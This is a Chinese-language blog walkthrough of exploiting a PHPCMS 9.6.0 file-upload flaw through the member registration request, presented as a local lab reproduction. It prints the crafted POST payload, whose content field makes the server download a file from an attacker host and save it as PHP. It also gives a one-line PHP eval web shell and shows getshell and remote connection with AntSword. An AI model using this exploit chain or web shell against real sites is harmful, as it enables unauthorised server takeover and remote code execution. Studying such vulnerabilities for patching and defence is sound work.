ailx10说：这篇是我2024年8月写的。PHPCMS 这篇我沿注册请求往下看，内容字段引用远程资源，系统又会把它下载到本地。文件名、查询部分和片段的组合让落地结果发生变化，接着才能访问并连接。一个注册功能后面竟然还带着取远端文件的动作，这种拐弯正是我想记下来的地方。实验里还要留意模型和账号信息，重复提交也得换新的用户名、邮箱，不是把同一个包按很多次就行。笔记保存的是那次环境中的链路，方便以后把每个隐藏动作找回来。

---

今天在本地复现一下PHPCMS 9.6.0 文件上传漏洞，就一个POST请求，直接拿下。要注意每次重放，需要修改username、password、pwdconfirm、email 字段的值，否则会遇到一些问题，比如：**模型中不存在content字段**，就需要修改modelid字段的值，但并不是每次都要修改modelid字段的值。

（1）正常注册流程

![](/notes-assets/b6af795eab0812aeca94.webp)

（2）抓包查看提交的内容

这是一个POST请求，主要载荷如下：

```
siteid=1&modelid=10&username=aixl10&password=ailx10&pwdconfirm=ailx10&
email=1@qq.com&nickname=ailx10&info[birthday]=2024-08-01&
dosubmit=同意注册协议，提交注册&protocol=
```

![](/notes-assets/a818f316d5bdc87459ce.webp)

（3）将载荷修改成下面这样的，进行重放

实验涉及账户注册和模型配置。重复请求需分别核查 modelid、用户名、邮箱及其他参数；不能假定所有配置均适用。

比如：

```
siteid=1&modelid=1&username=ailx16&password=ailx16&pwdconfirm=ailx16&email=6@qq.com&info[content]=<img src=http://192.168.0.107/1.txt?.php#.jpg>&dosubmit=1&protocol=
```

![](/notes-assets/9aa0aec1396929a17a7a.webp)

再比如：

```
siteid=1&modelid=2&username=ailx17&password=ailx17&pwdconfirm=ailx17&email=7@qq.com&info[content]=<img src=http://192.168.0.109/2.txt?.php#.jpg>&dosubmit=1&protocol=
```

![](/notes-assets/7586cd7dd8bf59468c29.webp)

（4）见证奇迹的时刻到了，访问上传到php文件路径，直接getshell

![](/notes-assets/ff19a0c5aacacfa045f8.webp)

（5）准备一句话木马

```
<?php @eval($_POST['ailx10']);?>
```

![](/notes-assets/38551ef861c3bb62e4a8.webp)

（6）蚁剑连接成功

![](/notes-assets/eda8c89546b157e380e6.webp)

![](/notes-assets/21302ce6f06bd79c104c.webp)

模型配置、注册状态和文件处理方式共同决定了结果。重复请求时，用户名和邮箱也会改变环境状态；把这些准备条件记下，才能理解为什么同一段请求并不总是得到同一个结果。
